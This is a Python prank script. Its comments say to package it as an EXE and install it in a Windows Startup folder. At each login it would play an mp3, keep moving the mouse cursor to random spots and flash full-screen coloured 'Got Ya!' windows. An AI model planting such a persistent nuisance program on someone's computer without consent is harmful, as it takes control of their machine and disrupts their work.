# Package as an EXE using something like auto py to exe
# Put the mp3 in the same directory as your exe (or python script if you are just running it as a python script)
#
# Put a shortcut in users startup folder at (current user):
# C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# or for all users at:
# C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
#
# Disclaimer -  This app is just to have a bit of fun, dont alter it to be malicious!!!


import tkinter as tk
import pyautogui as pg
import time
import random
import pygame
import os



swidth, sheight = pg.size()
current = os.getcwd()
for root, dirs, files in os.walk(current):
	for file in files:
		if(file.endswith(".mp3")):
			song = os.path.join(root,file)

pygame.init()
pygame.mixer.init()
pygame.mixer.music.load(song)
pygame.mixer.music.play()


while True:
	randomWidth = random.randint(1, swidth)
	randomHeight = random.randint(1, sheight)
	pg.moveTo(randomWidth, randomHeight, duration = .1)
	colours = ["red", "green", "yellow", "pink", "blue", "white", "purple"]
	randomColour = random.randint(0,6)
	root = tk.Tk()
	root.configure(bg=colours[randomColour])
	message = tk.Label(root, font="Helvetica 30 bold", text = "Got Ya! Move cursor to corner for freedom", bg=colours[randomColour])
	message.place(relx = 0.5, rely = 0.5, anchor="center")
	root.overrideredirect(True)
	root.state('zoomed')
	root.after(250, root.destroy) # set the flash time to 100 milliseconds # 
	root.mainloop()